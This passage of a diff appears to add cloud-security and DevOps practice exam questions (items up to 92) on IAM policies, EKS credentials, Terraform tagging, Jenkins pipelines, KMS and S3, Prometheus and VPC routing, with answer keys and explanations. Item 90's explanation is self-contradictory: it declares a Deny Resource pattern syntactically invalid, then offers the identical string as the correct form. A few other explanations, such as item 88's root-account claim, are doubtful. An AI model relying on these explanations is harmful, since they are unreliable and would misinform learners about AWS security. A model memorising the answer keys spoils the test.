+      "question": "A cloud security engineer is reviewing IAM permissions in an AWS account and finds the following policy attached to several roles used by application services:\n\n```json\n{\n  \"Version\": \"2012-10-17\",\n  \"Statement\": [\n    {\n      \"Sid\": \"DynamoDBAccessForApplication\",\n      \"Effect\": \"Allow\",\n      \"Action\": [\n        \"dynamodb:BatchGetItem\",\n        \"dynamodb:BatchWriteItem\",\n        \"dynamodb:DeleteItem\",\n        \"dynamodb:GetItem\",\n        \"dynamodb:PutItem\",\n        \"dynamodb:Query\",\n        \"dynamodb:Scan\",\n        \"dynamodb:UpdateItem\"\n      ],\n      \"Resource\": \"arn:aws:dynamodb:*:123456789012:table/App*\"\n    },\n    {\n      \"Sid\": \"S3AccessForLogs\",\n      \"Effect\": \"Allow\",\n      \"Action\": [\n        \"s3:GetObject\",\n        \"s3:PutObject\",\n        \"s3:ListBucket\"\n      ],\n      \"Resource\": [\n        \"arn:aws:s3:::app-logs-*/*\",\n        \"arn:aws:s3:::app-logs-*\"\n      ]\n    },\n    {\n      \"Sid\": \"SecretsManagerAccess\",\n      \"Effect\": \"Allow\",\n      \"Action\": [\n        \"secretsmanager:GetSecretValue\"\n      ],\n      \"Resource\": \"*\",\n      \"Condition\": {\n        \"StringLike\": {\n          \"secretsmanager:SecretId\": \"app-*\"\n        }\n      }\n    },\n    {\n      \"Sid\": \"AllowTaggingResources\",\n      \"Effect\": \"Allow\",\n      \"Action\": [\n        \"dynamodb:TagResource\",\n        \"s3:PutBucketTagging\",\n        \"kms:TagResource\"\n      ],\n      \"Resource\": \"*\"\n    }\n  ]\n}\n```\n\nWhich statement represents the most significant security concern in this policy?",
+      "options": [
+        "The DynamoDB permissions include Scan operations, which could lead to excessive data access",
+        "The S3 permissions don't restrict access by specific region, allowing cross-region data access",
+        "The Secrets Manager condition uses a wildcard prefix, potentially allowing access to unintended secrets",
+        "The tagging permissions have no resource restriction, allowing modification of tags on any resource"
+      ],
+      "correctAnswerIndex": 3,
+      "explanation": "The tagging permissions having no resource restriction is the most significant security concern in this policy. The 'AllowTaggingResources' statement grants dynamodb:TagResource, s3:PutBucketTagging, and kms:TagResource actions on ALL resources ('Resource': '*') without any conditions or restrictions. This violates the principle of least privilege and creates a potential privilege escalation path, as tags can be used for authorization in AWS through attribute-based access control (ABAC). An attacker could potentially modify tags on any resource in the account, including those they shouldn't have access to, potentially changing authorization boundaries or disrupting tag-based cost allocation and automation. The DynamoDB Scan operation is a legitimate requirement for many applications and is properly restricted to tables with the 'App' prefix. The S3 permissions lacking region restrictions is by design in AWS - S3 bucket ARNs don't include regions, and the permissions are appropriately scoped to buckets with the 'app-logs-' prefix. The Secrets Manager condition uses a wildcard prefix ('app-*'), but this is a common pattern for grouping related secrets and is implemented as a Condition rather than in the Resource field, which provides proper restriction to secrets beginning with 'app-'.",
+      "examTip": "When evaluating IAM policies for security concerns, pay close attention to any statement with 'Resource': '*' that isn't properly restricted by conditions—tagging permissions are particularly sensitive as they can affect resource governance, cost allocation, and potentially enable privilege escalation through tag-based access control systems."
+    },
+    {
+      "id": 84,
+      "question": "A cloud engineer is deploying a new application that processes sensitive data. The application uses EKS for container orchestration and needs to access RDS databases and S3 buckets securely. The engineer wants to follow security best practices for managing application credentials. Which approach for credential management provides the strongest security while maintaining operational efficiency?",
+      "options": [
+        "Store database credentials and access keys in Kubernetes Secrets encrypted with a KMS key",
+        "Use AWS IAM Roles for Service Accounts (IRSA) with limited IAM policies for S3 and RDS access",
+        "Mount credentials from AWS Secrets Manager into containers using a CSI driver",
+        "Configure application pods to use instance profiles from the EKS worker nodes"
+      ],
+      "correctAnswerIndex": 1,
+      "explanation": "Using AWS IAM Roles for Service Accounts (IRSA) with limited IAM policies provides the strongest security while maintaining operational efficiency. IRSA enables Kubernetes service accounts to assume IAM roles directly through a trust relationship, eliminating the need to store or manage long-lived credentials. This approach uses short-lived credentials that automatically rotate and implements the principle of least privilege by allowing fine-grained IAM policies specific to each service account and application. It leverages the native integration between EKS and AWS IAM, providing a seamless authentication experience without managing secrets. Storing credentials in Kubernetes Secrets, even when encrypted with KMS, still requires managing and rotating long-lived credentials, creating operational overhead and potential security risks if secrets need to be updated. Using Secrets Manager with a CSI driver is more secure than plain Kubernetes Secrets but still requires managing secret references and doesn't eliminate the use of long-lived credentials within the application. Configuring pods to use instance profiles from worker nodes would grant all pods running on the same node identical permissions, violating the principle of least privilege and making it impossible to have pod-specific access controls.",
+      "examTip": "For credential management in AWS container environments, prioritize approaches that eliminate the need to store long-lived credentials altogether—IAM Roles for Service Accounts (IRSA) provides pod-specific IAM permissions with automatic credential rotation, offering superior security compared to solutions that still require managing secret values, regardless of how they're stored or encrypted."
+    },
+    {
+      "id": 85,
+      "question": "A DevOps engineer is implementing infrastructure as code for a company's AWS environment using Terraform. The engineer wants to ensure that all resources are properly tagged for cost allocation and compliance purposes. After deployment, a compliance scan reports that multiple EC2 instances are missing required tags. The engineer reviews the following Terraform configuration:\n\n```hcl\nprovider \"aws\" {\n  region = \"us-west-2\"\n}\n\nresource \"aws_vpc\" \"main\" {\n  cidr_block = \"10.0.0.0/16\"\n  \n  tags = merge(\n    local.common_tags,\n    {\n      Name = \"${var.environment}-vpc\"\n    }\n  )\n}\n\nresource \"aws_subnet\" \"private\" {\n  count = length(var.private_subnet_cidrs)\n  \n  vpc_id     = aws_vpc.main.id\n  cidr_block = var.private_subnet_cidrs[count.index]\n  \n  tags = merge(\n    local.common_tags,\n    {\n      Name = \"${var.environment}-private-${count.index}\"\n    }\n  )\n}\n\nresource \"aws_security_group\" \"app\" {\n  name        = \"${var.environment}-app-sg\"\n  description = \"Security group for application servers\"\n  vpc_id      = aws_vpc.main.id\n  \n  ingress {\n    from_port   = 80\n    to_port     = 80\n    protocol    = \"tcp\"\n    cidr_blocks = [\"0.0.0.0/0\"]\n  }\n  \n  egress {\n    from_port   = 0\n    to_port     = 0\n    protocol    = \"-1\"\n    cidr_blocks = [\"0.0.0.0/0\"]\n  }\n  \n  tags = local.common_tags\n}\n\nresource \"aws_instance\" \"app_servers\" {\n  count = var.instance_count\n  \n  ami           = var.ami_id\n  instance_type = \"t3.medium\"\n  subnet_id     = aws_subnet.private[count.index % length(aws_subnet.private)].id\n  \n  # Security group attachment\n  vpc_security_group_ids = [aws_security_group.app.id]\n  \n  # Root volume configuration\n  root_block_device {\n    volume_size = 50\n    volume_type = \"gp3\"\n  }\n}\n\nlocals {\n  common_tags = {\n    Environment = var.environment\n    Project     = var.project_name\n    Owner       = var.team\n    ManagedBy   = \"Terraform\"\n  }\n}\n```\n\nWhat is causing the tagging compliance issue with the EC2 instances?",
+      "options": [
+        "The local.common_tags variable is not properly defined in the configuration",
+        "The aws_instance resource is missing the tags attribute in its configuration",
+        "The merge function is not correctly combining the tag maps for resources",
+        "The tags are being applied but the compliance scan is checking the wrong region"
+      ],
+      "correctAnswerIndex": 1,
+      "explanation": "The aws_instance resource is missing the tags attribute in its configuration, which is causing the tagging compliance issue. In the provided Terraform code, the aws_vpc, aws_subnet, and aws_security_group resources all have tags applied using the local.common_tags variable (with some resources also adding additional tags using the merge function). However, the aws_instance resource for the EC2 instances doesn't have any tags attribute defined at all, meaning no tags will be applied to these instances during deployment. This omission explains why the compliance scan is reporting missing tags specifically on EC2 instances. The local.common_tags variable is properly defined in the configuration under the locals block, containing Environment, Project, Owner, and ManagedBy tags. There's no indication of issues with the merge function, as it's being used correctly in the resources where it appears. The scenario doesn't suggest the compliance scan is checking the wrong region; it specifically identified EC2 instances with missing tags, which aligns with what we see in the configuration.",
+      "examTip": "When troubleshooting resource tagging issues in infrastructure as code, systematically check each resource type for the presence of the tags attribute—unlike some AWS resources that might inherit tags from parent resources, EC2 instances require explicit tag definitions and won't automatically inherit tags from their VPC, subnet, or security group."
+    },
+    {
+      "id": 86,
+      "question": "A cloud operations team is experiencing reliability issues with a distributed application deployed across multiple Availability Zones in AWS. The application consists of web servers, application servers, and a database tier. During peak traffic periods, some requests fail with timeout errors. The team collects the following metrics and logs:\n\n**CloudWatch Metrics:**\n- EC2 CPU Utilization: 60-75% across all instances\n- EC2 Network In/Out: Normal patterns, no significant spikes\n- RDS CPU Utilization: 55-65%\n- RDS Connections: 85-90% of maximum allowed connections\n- ELB 5XX errors: Sporadic spikes correlating with timeouts\n\n**Application Logs:**\n```\n[2023-05-16 15:42:12.345] INFO  [RequestProcessor:125] Processing request ID TX-98765\n[2023-05-16 15:42:12.455] DEBUG [ConnectionManager:89] Acquiring database connection from pool\n[2023-05-16 15:42:13.678] WARN  [ConnectionManager:92] Connection acquisition took 1223ms, exceeding threshold of 500ms\n[2023-05-16 15:42:13.780] DEBUG [TransactionManager:205] Beginning transaction for request TX-98765\n[2023-05-16 15:42:15.234] DEBUG [QueryExecutor:76] Executing query: SELECT * FROM customer_orders WHERE status = 'PENDING' AND region = 'WEST'\n[2023-05-16 15:42:17.546] DEBUG [QueryExecutor:79] Query completed in 2312ms\n[2023-05-16 15:42:17.678] DEBUG [TransactionManager:219] Committing transaction for request TX-98765\n[2023-05-16 15:42:17.901] DEBUG [ConnectionManager:124] Releasing connection back to pool\n[2023-05-16 15:42:17.923] INFO  [RequestProcessor:141] Completed request ID TX-98765 in 5578ms\n```\n\n**Database Analysis:**\n```\n---------------------------------------------------------------------------------------------------------\nTotal Execution Time: 1.452 sec\nExecution Plan\n---------------------------------------------------------------------------------------------------------\nNestloop  (cost=4.65..1493.52 rows=745 width=182) (actual time=0.089..1.446 rows=19 loops=1)\n  ->  Seq Scan on customer_orders  (cost=0.00..1260.45 rows=745 width=182) (actual time=0.058..1.372 rows=19 loops=1)\n        Filter: ((status = 'PENDING'::order_status) AND (region = 'WEST'::text))\n        Rows Removed by Filter: 27644\n---------------------------------------------------------------------------------------------------------\n```\n\nWhat is the most likely root cause of the reliability issues based on this information?",
+      "options": [
+        "Insufficient instance capacity causing CPU throttling during peak loads",
+        "Network latency between application tier and database tier causing timeouts",
+        "Database query performance issues due to missing indexes on frequently filtered columns",
+        "Connection pool exhaustion leading to queuing and eventual timeouts"
+      ],
+      "correctAnswerIndex": 2,
+      "explanation": "Database query performance issues due to missing indexes on frequently filtered columns is the most likely root cause of the reliability issues. The execution plan in the database analysis clearly shows a sequential scan (Seq Scan) being performed on the customer_orders table, examining 27,663 rows (27,644 removed by filter + 19 matching rows) to find just 19 matching records. This is highly inefficient and explains the long query execution time of 2312ms seen in the application logs. The filter is being applied on 'status' and 'region' columns without using an index, forcing the database to scan the entire table. This is further supported by the execution plan's 'Filter' line showing these exact conditions. While the RDS connections metric is high (85-90%), the application logs don't show connection acquisition failures, just warnings about slow acquisition. CPU utilization across components is elevated but not at levels that would typically cause failures (all below 75%). There's no evidence of network latency issues in the provided metrics and logs. The application logs show that database operations are consuming the majority of the request processing time, with query execution taking 2312ms out of the total 5578ms request time.",
+      "examTip": "When analyzing application performance issues, examine database execution plans carefully—sequential scans processing thousands of rows to return a small result set often indicate missing indexes on filtered columns, which can cause significant performance degradation under load."
+    },
+    {
+      "id": 87,
+      "question": "A DevOps engineer is setting up a CI/CD pipeline for a microservices application that will be deployed in Kubernetes. The pipeline needs to build container images, scan them for vulnerabilities, and deploy them to different environments. The engineer creates the following Jenkins pipeline configuration:\n\n```groovy\npipeline {\n  agent any\n  environment {\n    DOCKER_REGISTRY = 'registry.example.com'\n    IMAGE_NAME = 'payment-service'\n    KUBECONFIG = credentials('kubeconfig')\n  }\n  stages {\n    stage('Checkout') {\n      steps {\n        checkout scm\n      }\n    }\n    stage('Build') {\n      steps {\n        sh \"docker build -t ${DOCKER_REGISTRY}/${IMAGE_NAME}:${BUILD_NUMBER} .\"\n      }\n    }\n    stage('Scan') {\n      steps {\n        sh \"trivy image ${DOCKER_REGISTRY}/${IMAGE_NAME}:${BUILD_NUMBER} --severity HIGH,CRITICAL --exit-code 0\"\n      }\n    }\n    stage('Push') {\n      steps {\n        sh \"docker push ${DOCKER_REGISTRY}/${IMAGE_NAME}:${BUILD_NUMBER}\"\n        sh \"docker tag ${DOCKER_REGISTRY}/${IMAGE_NAME}:${BUILD_NUMBER} ${DOCKER_REGISTRY}/${IMAGE_NAME}:latest\"\n        sh \"docker push ${DOCKER_REGISTRY}/${IMAGE_NAME}:latest\"\n      }\n    }\n    stage('Deploy Dev') {\n      steps {\n        sh \"kubectl --kubeconfig=${KUBECONFIG} set image deployment/${IMAGE_NAME} ${IMAGE_NAME}=${DOCKER_REGISTRY}/${IMAGE_NAME}:${BUILD_NUMBER} -n dev\"\n      }\n    }\n    stage('Deploy Prod') {\n      steps {\n        sh \"kubectl --kubeconfig=${KUBECONFIG} set image deployment/${IMAGE_NAME} ${IMAGE_NAME}=${DOCKER_REGISTRY}/${IMAGE_NAME}:${BUILD_NUMBER} -n prod\"\n      }\n    }\n  }\n}\n```\n\nWhich aspect of this pipeline configuration represents a security or operational risk?",
+      "options": [
+        "Using the 'latest' tag for container images creates ambiguity and potential deployment inconsistencies",
+        "Storing the kubeconfig as a Jenkins credential could expose sensitive cluster access information",
+        "Setting the vulnerability scanner exit code to 0 allows builds to succeed despite critical vulnerabilities",
+        "Deploying directly to production immediately after development without testing or approval gates"
+      ],
+      "correctAnswerIndex": 3,
+      "explanation": "Deploying directly to production immediately after development without testing or approval gates represents the most significant security and operational risk in this pipeline. The configuration shows that after deploying to the development environment ('Deploy Dev' stage), the pipeline immediately proceeds to deploy the same build to production ('Deploy Prod' stage) without any intervening testing, validation, or approval steps. This practice bypasses essential quality gates that should exist between environments, potentially allowing bugs, security issues, or untested features to reach production. A proper pipeline should include stages for testing in the development environment, potentially a staging environment deployment, and manual approval before production deployment. Setting the vulnerability scanner exit code to 0 is concerning but less severe, as the scan results are still generated and could be reviewed. Using the 'latest' tag alongside the build-specific tag is a common practice, albeit with some risks. Storing the kubeconfig as a Jenkins credential is actually a reasonable security practice as long as proper Jenkins credential security is maintained, as this keeps sensitive information out of the pipeline code itself.",
+      "examTip": "When reviewing CI/CD pipelines for production systems, ensure proper separation exists between development and production deployments—automated deployments that proceed directly to production without intermediate environments, testing stages, or approval gates create significant operational risk regardless of how well individual build and scan stages are implemented."
+    },
+    {
+      "id": 88,
+      "question": "A cloud engineer at a financial services company is implementing a solution to protect sensitive data stored in S3 buckets. The company requires that all sensitive data must be encrypted, with keys managed by the security team, and access to the data must be strictly controlled. The engineer deploys the following CloudFormation template to set up the encryption infrastructure:\n\n```yaml\nAWSTemplateFormatVersion: '2010-09-09'\nDescription: 'S3 Encryption Infrastructure'\n\nResources:\n  EncryptionKey:\n    Type: 'AWS::KMS::Key'\n    Properties:\n      Description: 'KMS key for encrypting sensitive financial data'\n      KeyPolicy:\n        Version: '2012-10-17'\n        Id: 'key-policy'\n        Statement:\n          - Sid: 'Allow administration of the key'\n            Effect: 'Allow'\n            Principal:\n              AWS: !Sub 'arn:aws:iam::${AWS::AccountId}:role/KeyAdministratorRole'\n            Action:\n              - 'kms:Create*'\n              - 'kms:Describe*'\n              - 'kms:Enable*'\n              - 'kms:List*'\n              - 'kms:Put*'\n              - 'kms:Update*'\n              - 'kms:Revoke*'\n              - 'kms:Disable*'\n              - 'kms:Get*'\n              - 'kms:Delete*'\n              - 'kms:ScheduleKeyDeletion'\n              - 'kms:CancelKeyDeletion'\n            Resource: '*'\n          - Sid: 'Allow use of the key'\n            Effect: 'Allow'\n            Principal:\n              AWS: !Sub 'arn:aws:iam::${AWS::AccountId}:role/DataProcessingRole'\n            Action:\n              - 'kms:Encrypt'\n              - 'kms:Decrypt'\n              - 'kms:ReEncrypt*'\n              - 'kms:GenerateDataKey*'\n              - 'kms:DescribeKey'\n            Resource: '*'\n            \n  EncryptionKeyAlias:\n    Type: 'AWS::KMS::Alias'\n    Properties:\n      AliasName: 'alias/financial-data-key'\n      TargetKeyId: !Ref EncryptionKey\n      \n  SensitiveDataBucket:\n    Type: 'AWS::S3::Bucket'\n    Properties:\n      BucketName: !Sub 'financial-data-${AWS::AccountId}'\n      BucketEncryption:\n        ServerSideEncryptionConfiguration:\n          - ServerSideEncryptionByDefault:\n              SSEAlgorithm: 'aws:kms'\n              KMSMasterKeyID: !GetAtt EncryptionKey.Arn\n      PublicAccessBlockConfiguration:\n        BlockPublicAcls: true\n        BlockPublicPolicy: true\n        IgnorePublicAcls: true\n        RestrictPublicBuckets: true\n      VersioningConfiguration:\n        Status: 'Enabled'\n```\n\nWhich aspect of this implementation introduces a risk to the security of the encrypted data?",
+      "options": [
+        "The KMS key policy doesn't include the root account as an administrator",
+        "The S3 bucket doesn't have a bucket policy restricting access to specific IAM roles",
+        "The KMS key doesn't have automatic rotation enabled for the encryption key",
+        "The ServerSideEncryptionByDefault configuration applies only to new objects"
+      ],
+      "correctAnswerIndex": 3,
+      "explanation": "The ServerSideEncryptionByDefault configuration applies only to new objects, which introduces a security risk for the financial data. This configuration ensures that new objects uploaded to the bucket are encrypted with the specified KMS key, but it doesn't address existing objects or enforce encryption for objects uploaded through different methods (like pre-signed URLs that specify different encryption settings). For a financial services company with strict encryption requirements, this creates a risk that some data might remain unencrypted or be uploaded without proper encryption. The solution should include a bucket policy that explicitly denies uploading unencrypted objects (using the s3:x-amz-server-side-encryption condition) and a remediation process for existing objects. The KMS key policy not including the root account is actually a security best practice in many organizations, as it enforces separation of duties and prevents the root account from being used for key management. The absence of a bucket policy restricting access is a concern but less critical than the encryption issue, as the KMS key policy already restricts who can decrypt the data. The lack of automatic key rotation is a valid security consideration, but most financial compliance frameworks consider annual manual rotation acceptable, making this less critical than the potential for unencrypted data.",
+      "examTip": "When implementing encryption for sensitive data in cloud storage, remember that server-side encryption settings often apply only to new objects by default—for comprehensive protection, implement policies that deny uploading unencrypted objects and ensure existing objects are also encrypted to the same standard."
+    },
+    {
+      "id": 89,
+      "question": "A DevOps engineer is implementing a monitoring solution for a microservices application deployed on Kubernetes. The engineer needs to track custom application metrics, system performance, and API latency. They implement the following Prometheus configuration for service discovery:\n\n```yaml\nglobal:\n  scrape_interval: 15s\n  evaluation_interval: 15s\n\nscrape_configs:\n  - job_name: 'kubernetes-pods'\n    kubernetes_sd_configs:\n      - role: pod\n    relabel_configs:\n      - source_labels: [__meta_kubernetes_pod_annotation_prometheus_io_scrape]\n        action: keep\n        regex: true\n      - source_labels: [__meta_kubernetes_pod_annotation_prometheus_io_path]\n        action: replace\n        target_label: __metrics_path__\n        regex: (.+)\n      - source_labels: [__address__, __meta_kubernetes_pod_annotation_prometheus_io_port]\n        action: replace\n        regex: ([^:]+)(?::\\d+)?;(\\d+)\n        replacement: $1:$2\n        target_label: __address__\n      - action: labelmap\n        regex: __meta_kubernetes_pod_label_(.+)\n      - source_labels: [__meta_kubernetes_namespace]\n        action: replace\n        target_label: kubernetes_namespace\n      - source_labels: [__meta_kubernetes_pod_name]\n        action: replace\n        target_label: kubernetes_pod_name\n```\n\nThe engineer deploys application pods with the following annotations:\n\n```yaml\nmetadata:\n  annotations:\n    prometheus.io/scrape: \"true\"\n    prometheus.io/port: \"8080\"\n```\n\nAfter deployment, the engineer notices that while system metrics are being collected properly, no application metrics are visible in Prometheus. What is the most likely cause of this issue?",
+      "options": [
+        "The scrape_interval is too long, causing application metrics to be missed between collections",
+        "The application metrics endpoint doesn't match Prometheus's default path of /metrics",
+        "The pod annotations use 'prometheus.io' instead of '__meta_kubernetes_pod_annotation_prometheus_io'",
+        "The relabel_configs regex patterns aren't correctly matching the pod annotation values"
+      ],
+      "correctAnswerIndex": 1,
+      "explanation": "The most likely cause is that the application metrics endpoint doesn't match Prometheus's default path of /metrics. In the provided configuration, there's a relabel_config that looks for the __meta_kubernetes_pod_annotation_prometheus_io_path annotation to set the metrics path, but the deployed pods don't include this annotation. Without this annotation, Prometheus will use its default path of /metrics to scrape the pods. If the application is exposing metrics on a different path (like /prometheus or /actuator/prometheus), Prometheus won't find them. The pod annotations correctly specify prometheus.io/scrape and prometheus.io/port, but are missing prometheus.io/path to tell Prometheus where to find the metrics. The scrape_interval of 15 seconds is a reasonable default and wouldn't cause metrics to be missed entirely. The annotation format is correct; Kubernetes automatically transforms pod annotations like 'prometheus.io/scrape' into '__meta_kubernetes_pod_annotation_prometheus_io_scrape' for service discovery. The relabel_configs regex patterns are standard and widely used, correctly matching boolean values and extracting port numbers as shown.",
+      "examTip": "When troubleshooting Prometheus metric collection in Kubernetes, verify that all required annotations are present—while prometheus.io/scrape enables discovery and prometheus.io/port specifies the port, applications exposing metrics on non-standard paths also need the prometheus.io/path annotation to direct Prometheus to the correct endpoint."
+    },
+    {
+      "id": 90,
+      "question": "A cloud security engineer is analyzing access logs after a security incident. The incident involved unauthorized access to a cloud storage bucket containing sensitive data. The following are excerpts from the access logs during the time of the incident:\n\n```\nTimestamp: 2023-06-12T03:14:22Z\nUser: john.doe@company.com\nAction: AssumeRole\nRequestParameters: {\"roleArn\": \"arn:aws:iam::123456789012:role/DataAnalyst\", \"roleSessionName\": \"DataAnalysis\", \"durationSeconds\": 3600}\nResponseElements: {\"credentials\": {\"accessKeyId\": \"ASIA3EXAMPLE\", \"sessionToken\": \"[FILTERED]\", \"expiration\": \"2023-06-12T04:14:22Z\"}}\n\nTimestamp: 2023-06-12T03:16:45Z\nUser: assumed-role/DataAnalyst/DataAnalysis\nAction: GetObject\nRequestParameters: {\"bucketName\": \"hr-records\", \"key\": \"employees/2023/salary-data.csv\"}\n\nTimestamp: 2023-06-12T03:19:58Z\nUser: assumed-role/DataAnalyst/DataAnalysis\nAction: ListObjects\nRequestParameters: {\"bucketName\": \"hr-records\", \"prefix\": \"employees/2023/\"}\n\nTimestamp: 2023-06-12T03:23:47Z\nUser: assumed-role/DataAnalyst/DataAnalysis\nAction: GetObject\nRequestParameters: {\"bucketName\": \"hr-records\", \"key\": \"employees/2023/performance-reviews.pdf\"}\n```\n\nDuring the investigation, the security engineer discovers the following IAM policy attached to the DataAnalyst role:\n\n```json\n{\n  \"Version\": \"2012-10-17\",\n  \"Statement\": [\n    {\n      \"Effect\": \"Allow\",\n      \"Action\": [\n        \"s3:GetObject\",\n        \"s3:ListBucket\"\n      ],\n      \"Resource\": [\n        \"arn:aws:s3:::analytics-data/*\",\n        \"arn:aws:s3:::analytics-data\"\n      ]\n    },\n    {\n      \"Effect\": \"Deny\",\n      \"Action\": \"s3:*\",\n      \"Resource\": \"arn:aws:s3:::hr-records/employees/*/salary-*.csv\",\n      \"Condition\": {\n        \"StringNotEquals\": {\n          \"aws:username\": \"finance-service\"\n        }\n      }\n    }\n  ]\n}\n```\n\nBased on this information, what allowed the unauthorized access to occur?",
+      "options": [
+        "The Deny statement is using incorrect syntax for the Resource field",
+        "The role policy allows ListBucket on analytics-data but is accessing hr-records",
+        "The Condition element is checking aws:username instead of aws:userId for assumed roles",
+        "The Deny statement's resource pattern doesn't match the actual object path structure"
+      ],
+      "correctAnswerIndex": 0,
+      "explanation": "The Deny statement is using incorrect syntax for the Resource field, which is the root cause allowing unauthorized access. The Deny statement's Resource field uses a path-style syntax (\"arn:aws:s3:::hr-records/employees/*/salary-*.csv\"), but S3 resource patterns in IAM policies require bucket and object resources to be specified separately. The correct syntax should be \"arn:aws:s3:::hr-records/employees/*/salary-*.csv\" for objects. Due to this syntax error, the Deny statement is essentially invalid and doesn't apply to any resources, allowing access to salary data that should be restricted. The policy does allow ListBucket and GetObject on analytics-data bucket, but there's no Allow statement for hr-records bucket, suggesting the user shouldn't have access to it at all. This indicates there must be another policy (not shown) granting access to hr-records that's allowing the access. The Condition checking aws:username instead of aws:userId isn't relevant here, as the issue is with the Resource pattern syntax, not the identity evaluation. The resource pattern itself (ignoring the syntax error) seems to correctly target the salary data file based on the access logs, which show access to \"employees/2023/salary-data.csv\".",
+      "examTip": "When troubleshooting unauthorized S3 access, carefully check the syntax of IAM policy Resource elements—remember that path-style patterns for S3 objects require the full ARN format 'arn:aws:s3:::bucket-name/object-path' and are evaluated differently than patterns for other AWS services."
+    },
+    {
+      "id": 91,
+      "question": "A cloud engineer is deploying a multi-tier application in AWS with strict security requirements. The application consists of web, application, and database tiers. The network architecture must follow security best practices for isolation and access control. The engineer creates the following CloudFormation template excerpt to set up the VPC and subnets:\n\n```yaml\nResources:\n  VPC:\n    Type: AWS::EC2::VPC\n    Properties:\n      CidrBlock: 10.0.0.0/16\n      EnableDnsSupport: true\n      EnableDnsHostnames: true\n      Tags:\n        - Key: Name\n          Value: !Sub ${EnvironmentName}-VPC\n          \n  InternetGateway:\n    Type: AWS::EC2::InternetGateway\n    Properties:\n      Tags:\n        - Key: Name\n          Value: !Sub ${EnvironmentName}-IGW\n          \n  InternetGatewayAttachment:\n    Type: AWS::EC2::VPCGatewayAttachment\n    Properties:\n      InternetGatewayId: !Ref InternetGateway\n      VpcId: !Ref VPC\n      \n  PublicSubnet1:\n    Type: AWS::EC2::Subnet\n    Properties:\n      VpcId: !Ref VPC\n      AvailabilityZone: !Select [0, !GetAZs '']\n      CidrBlock: 10.0.1.0/24\n      MapPublicIpOnLaunch: true\n      Tags:\n        - Key: Name\n          Value: !Sub ${EnvironmentName}-PublicSubnet1\n          \n  PublicSubnet2:\n    Type: AWS::EC2::Subnet\n    Properties:\n      VpcId: !Ref VPC\n      AvailabilityZone: !Select [1, !GetAZs '']\n      CidrBlock: 10.0.2.0/24\n      MapPublicIpOnLaunch: true\n      Tags:\n        - Key: Name\n          Value: !Sub ${EnvironmentName}-PublicSubnet2\n          \n  AppSubnet1:\n    Type: AWS::EC2::Subnet\n    Properties:\n      VpcId: !Ref VPC\n      AvailabilityZone: !Select [0, !GetAZs '']\n      CidrBlock: 10.0.11.0/24\n      MapPublicIpOnLaunch: false\n      Tags:\n        - Key: Name\n          Value: !Sub ${EnvironmentName}-AppSubnet1\n          \n  AppSubnet2:\n    Type: AWS::EC2::Subnet\n    Properties:\n      VpcId: !Ref VPC\n      AvailabilityZone: !Select [1, !GetAZs '']\n      CidrBlock: 10.0.12.0/24\n      MapPublicIpOnLaunch: false\n      Tags:\n        - Key: Name\n          Value: !Sub ${EnvironmentName}-AppSubnet2\n          \n  DBSubnet1:\n    Type: AWS::EC2::Subnet\n    Properties:\n      VpcId: !Ref VPC\n      AvailabilityZone: !Select [0, !GetAZs '']\n      CidrBlock: 10.0.21.0/24\n      MapPublicIpOnLaunch: false\n      Tags:\n        - Key: Name\n          Value: !Sub ${EnvironmentName}-DBSubnet1\n          \n  DBSubnet2:\n    Type: AWS::EC2::Subnet\n    Properties:\n      VpcId: !Ref VPC\n      AvailabilityZone: !Select [1, !GetAZs '']\n      CidrBlock: 10.0.22.0/24\n      MapPublicIpOnLaunch: false\n      Tags:\n        - Key: Name\n          Value: !Sub ${EnvironmentName}-DBSubnet2\n          \n  PublicRouteTable:\n    Type: AWS::EC2::RouteTable\n    Properties:\n      VpcId: !Ref VPC\n      Tags:\n        - Key: Name\n          Value: !Sub ${EnvironmentName}-PublicRoutes\n          \n  DefaultPublicRoute:\n    Type: AWS::EC2::Route\n    DependsOn: InternetGatewayAttachment\n    Properties:\n      RouteTableId: !Ref PublicRouteTable\n      DestinationCidrBlock: 0.0.0.0/0\n      GatewayId: !Ref InternetGateway\n      \n  PublicSubnet1RouteTableAssociation:\n    Type: AWS::EC2::SubnetRouteTableAssociation\n    Properties:\n      RouteTableId: !Ref PublicRouteTable\n      SubnetId: !Ref PublicSubnet1\n      \n  PublicSubnet2RouteTableAssociation:\n    Type: AWS::EC2::SubnetRouteTableAssociation\n    Properties:\n      RouteTableId: !Ref PublicRouteTable\n      SubnetId: !Ref PublicSubnet2\n```\n\nWhich critical security component is missing from this VPC architecture?",
+      "options": [
+        "NAT Gateways for outbound internet access from private subnets",
+        "Network ACLs to filter traffic between subnet tiers",
+        "VPC Endpoints for secure access to AWS services",
+        "Private Route Tables for application and database subnets"
+      ],
+      "correctAnswerIndex": 3,
+      "explanation": "Private Route Tables for application and database subnets are the critical security component missing from this VPC architecture. The template defines a Public Route Table with a default route to the Internet Gateway, and associates it with the public subnets. However, there are no route tables defined or associated with the application and database subnets. Without explicitly defined route tables, these subnets will use the VPC's main route table by default. If the main route table has or later gets a default route to the Internet Gateway, the supposedly private subnets would have direct outbound (and potentially inbound) internet access, violating the security isolation principles for multi-tier applications. Private subnets should have their own route tables without a route to the internet gateway to ensure proper network isolation. NAT Gateways are important for outbound internet access from private subnets but are secondary to having properly defined route tables. Network ACLs provide an additional security layer but aren't as critical as basic subnet isolation through route tables. VPC Endpoints are beneficial for secure AWS service access but aren't as fundamental as proper subnet routing for basic network security.",
+      "examTip": "When reviewing VPC architectures, always verify that private subnets have explicit route table associations rather than relying on the default main route table—this is a fundamental security control for maintaining proper subnet isolation, as the main route table could be modified later to include routes that compromise the intended security boundaries."
+    },
+    {
+      "id": 92,
